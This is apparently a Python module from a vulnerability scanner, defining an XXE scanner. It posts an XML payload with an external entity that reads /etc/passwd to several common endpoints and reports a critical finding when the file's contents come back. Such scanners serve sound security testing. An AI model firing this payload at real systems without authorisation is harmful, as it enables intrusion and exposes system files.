import scan_engine.helpers.http_client as http_client
from scan_engine.helpers.http_client import get_session
import json
import xml.etree.ElementTree as ET

class XXEScanner:
    def __init__(self, target, options=None):
        self.options = options
        self.target = target

    def scan_xxe(self, port, protocol='http', logger=None):
        findings = []
        base_url = f"{protocol}://{self.target}:{port}"
        
        # XXE Payload aiming to read /etc/passwd or similar
        # Using a generic entity definition
        payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""

        if logger: logger(f"🕷️ XXE Audit: Testing XML endpoints on {base_url}...", "INFO")
        
        # Heuristic: Check if endpoint accepts XML or similar
        # We can try to POST this to common endpoints like /api, /soap, /xml
        endpoints = ["/api/xml", "/soap", "/xmlrpc", "/data"]

        for ep in endpoints:
            try:
                target_url = base_url + ep
                headers = {'Content-Type': 'application/xml'}
                r = http_client.post(target_url, options=getattr(self, "options", None), data=payload, headers=headers, timeout=5)
                
                if "root:x:0:0" in r.text or "bin/bash" in r.text:
                    findings.append({
                        "title": "CRITICAL: XXE Injection Detected",
                        "description": f"The application at `{target_url}` is vulnerable to XML External Entity (XXE) injection. It processed our payload and returned system file content.",
                        "severity": "critical",
                        "tool_source": "xxe_scanner",
                        "raw_loot": target_url,
                        "method": "POST",
                        "payload": payload,
                        "status_code": r.status_code,
                        "response_snippet": r.text[:200] if len(r.text) > 200 else r.text
                    })
                    if logger: logger(f"💀 XXE CONFIRMED: {target_url}", "CRITICAL")
            except Exception:
                pass
        return findings
